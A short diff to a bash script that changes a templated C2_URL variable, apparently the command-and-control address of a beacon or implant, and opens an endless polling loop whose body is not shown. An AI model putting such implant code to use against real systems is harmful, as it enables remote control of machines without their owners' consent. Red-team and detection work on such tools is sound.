@@ -1,5 +1,5 @@
 #!/bin/bash
-C2_URL="https://__HOSTNAME__"
+C2_URL="https://__HOSTNAME__/$(echo __PATH__ | sed -E 's#/[^/]+$#/#')"
 
 while [ true ]
 do
